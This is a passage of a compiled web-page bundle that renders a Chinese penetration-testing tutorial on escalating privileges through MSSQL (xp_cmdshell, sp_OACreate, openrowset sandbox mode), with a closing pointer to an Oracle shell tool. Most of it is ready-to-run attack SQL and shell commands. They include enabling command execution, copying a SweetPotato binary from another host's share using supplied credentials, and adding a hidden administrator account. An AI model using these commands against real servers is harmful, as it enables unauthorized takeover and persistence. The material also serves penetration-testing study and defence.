"),a("h3",{attrs:{id:"mssql数据库提权"}},[s._v("MSSQL数据库提权 "),a("a",{staticClass:"header-anchor",attrs:{href:"#mssql数据库提权"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[s._v("首先查看权限")])]),s._v(" "),a("div",{staticClass:"language-sql line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-sql"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("--是否sa权限，返回 1 就是sa")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("select")]),s._v(" IS_SRVROLEMEMBER"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'sysadmin'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("--是否dba权限，返回 1 就是DBA")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("select")]),s._v(" IS_MEMBER"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'db_owner'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[a("strong",[s._v("一、xp_cmdshell")])]),s._v(" "),a("blockquote",[a("p",[a("strong",[s._v("适用(xp\\2000\\2003系统)")])]),s._v(" "),a("p",[s._v("前提是MSSQL是以system用户运行的，才能提权；")]),s._v(" "),a("p",[s._v("如果用nt authority\\network service运行，是没有系统权限的。")])]),s._v(" "),a("p",[s._v("默认情况下是关闭的，用下边的命令开启")]),s._v(" "),a("div",{staticClass:"language-sql line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-sql"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("EXEC")]),s._v(" sp_configure "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'show advanced options'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("--允许修改高级参数")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("RECONFIGURE")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("EXEC")]),s._v(" sp_configure "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'xp_cmdshell'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("--打开xp_cmdshell扩展")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("RECONFIGURE")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("如果xp_cmdshell被删除，可以尝试上传"),a("code",[s._v("xplog70.dll")]),s._v(" https://fix4dll.com/xplog70_dll 进行恢复，恢复语句：")]),s._v(" "),a("div",{staticClass:"language-sql line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-sql"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("Exec")]),s._v(" master"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("dbo"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sp_addextendedproc "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'xp_cmdshell'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'c:\\\\xplog70.dll'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("然后执行命令")]),s._v(" "),a("div",{staticClass:"language-sql line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-sql"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("exec")]),s._v(" xp_cmdshell "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'whoami'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("sa提权登RDP")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("exec")]),s._v(" xp_cmdshell "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'net use "),a("span",{pre:!0,attrs:{class:"token entity",title:"\\\\"}},[s._v("\\\\")]),s._v("192.168.10.133\\ipc$ mcc5@133 /user:192.168.10.133"),a("span",{pre:!0,attrs:{class:"token entity",title:"\\a"}},[s._v("\\a")]),s._v("dministrator&& copy "),a("span",{pre:!0,attrs:{class:"token entity",title:"\\\\"}},[s._v("\\\\")]),s._v("192.168.10.133"),a("span",{pre:!0,attrs:{class:"token entity",title:"\\c"}},[s._v("\\c")]),s._v("$\\users\\public"),a("span",{pre:!0,attrs:{class:"token entity",title:"\\v"}},[s._v("\\v")]),s._v("ideos\\sweetpotato.exe c:\\users\\public"),a("span",{pre:!0,attrs:{class:"token entity",title:"\\v"}},[s._v("\\v")]),s._v("ideos\\s.exe'")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("exec")]),s._v(" xp_cmdshell "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'c:\\users\\public"),a("span",{pre:!0,attrs:{class:"token entity",title:"\\v"}},[s._v("\\v")]),s._v('ideos\\s.exe -a "whoami"\'')]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("exec")]),s._v(" xp_cmdshell "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'c:\\users\\public"),a("span",{pre:!0,attrs:{class:"token entity",title:"\\v"}},[s._v("\\v")]),s._v('ideos\\s.exe -a "net user admin$ @admin.886 /add&net localgroup administrators admin$ /add"\'')]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[a("strong",[s._v("二、SP_OACreate")])]),s._v(" "),a("blockquote",[a("p",[a("strong",[s._v("适用(xp\\2000\\2003系统)")])])]),s._v(" "),a("p",[s._v("当xp_cmdshell 删除以后，还可以使用SP_OACreate")]),s._v(" "),a("p",[a("strong",[s._v("首先要打开组件：")])]),s._v(" "),a("div",{staticClass:"language-sql line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-sql"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("--开启EXEC")]),s._v("\nsp_configure "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'show advanced options'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("RECONFIGURE")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("EXEC")]),s._v(" sp_configure "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'Ole Automation Procedures'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("RECONFIGURE")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("--关闭EXEC")]),s._v("\nsp_configure "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'show advanced options'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("RECONFIGURE")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("EXEC")]),s._v(" sp_configure "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'Ole Automation Procedures'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("RECONFIGURE")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br")])]),a("p",[a("strong",[s._v("之后使用以下语句执行命令：")])]),s._v(" "),a("div",{staticClass:"language-sql line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-sql"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("declare")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("@shell")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("int")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("exec")]),s._v(" sp_oacreate "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'wscript.shell'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("@shell")]),s._v(" output "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("exec")]),s._v(" sp_oamethod "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("@shell")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'run'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token boolean"}},[s._v("null")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'c:\\windows\\system32\\cmd.exe /c whoami >c:\\\\1.txt'")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("这种方式是无回显的，打开1.txt查看命令执行结果")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("type")]),s._v(" c:"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(".txt\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("三、openrowset沙盒")])]),s._v(" "),a("blockquote",[a("p",[a("strong",[s._v("(2003系统可用、2012-r2实验失败)")])])]),s._v(" "),a("p",[a("strong",[s._v("首先检查cmd_shell是否开启")])]),s._v(" "),a("div",{staticClass:"language-sql line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-sql"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("select")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("count")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" master"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("dbo"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sysobjects "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("where")]),s._v(" xtype"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'x'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("and")]),s._v(" name"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'xp_cmdshell'")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("--结果为 1 就是开启")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[a("strong",[s._v("第二步 开启默认关闭的xp_regwrite存储过程")])]),s._v(" "),a("div",{staticClass:"language-sql line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-sql"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("--开启")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("EXEC")]),s._v(" master"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("xp_regwrite "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'HKEY_LOCAL_MACHINE'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'SOFTWARE\\Microsoft\\Jet\\4.0\\Engines'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'SandBoxMode'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'REG_DWORD'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("EXEC")]),s._v(" sp_configure "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'show advanced options'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("\nGO\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("RECONFIGURE")]),s._v("\nGO\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("EXEC")]),s._v(" sp_configure "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'Ad Hoc Distributed Queries'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("\nGO\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("RECONFIGURE")]),s._v("\nGO\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("--利用完后恢复")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("EXEC")]),s._v(" master"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("xp_regwrite "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'HKEY_LOCAL_MACHINE'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'SOFTWARE\\Microsoft\\Jet\\4.0\\Engines'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'SandBoxMode'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'REG_DWORD'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("EXEC")]),s._v(" sp_configure "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'Ad Hoc Distributed Queries'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("reconfigure")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("EXEC")]),s._v(" sp_configure "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'show advanced options'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("reconfigure")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br")])]),a("p",[a("strong",[s._v("利用jet.oledb执行系统命令")])]),s._v(" "),a("div",{staticClass:"language-sql line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-sql"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("select")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("openrowset")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'microsoft.jet.oledb.4.0'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("';database=c:\\windows\\system32\\ias\\ias.mdb'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'select shell(\"cmd.exe /c whoami > c:\\\\666.txt\")'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("这个也是无回显的")]),s._v(" "),a("p",[a("strong",[s._v("沙盒模式SandBoxMode参数含义（默认是2）")])]),s._v(" "),a("blockquote",[a("p",[a("code",[s._v("0")]),s._v("：在任何所有者中禁止启用安全模式")]),s._v(" "),a("p",[a("code",[s._v("1")]),s._v(" ：为仅在允许范围内")]),s._v(" "),a("p",[a("code",[s._v("2")]),s._v(" ：必须在access模式下")]),s._v(" "),a("p",[a("code",[s._v("3")]),s._v("：完全开启")])]),s._v(" "),a("p",[s._v("openrowset是可以通过OLE DB访问SQL Server数据库")]),s._v(" "),a("p",[s._v("OLE DB是应用程序链接到SQL Server的的驱动程序")]),s._v(" "),a("h3",{attrs:{id:"oracle提权"}},[s._v("Oracle提权 "),a("a",{staticClass:"header-anchor",attrs:{href:"#oracle提权"}},[s._v("#")])]),s._v(" "),a("p",[s._v("利用"),a("a",{attrs:{href:"https://github.com/jas502n/oracleShell",target:"_blank",rel:"noopener noreferrer"}},[s._v("OracleShell.jar"),a("OutboundLink")],1),s._v("工具")])])}),[],!1,null,null,null);t.default=n.exports}}]);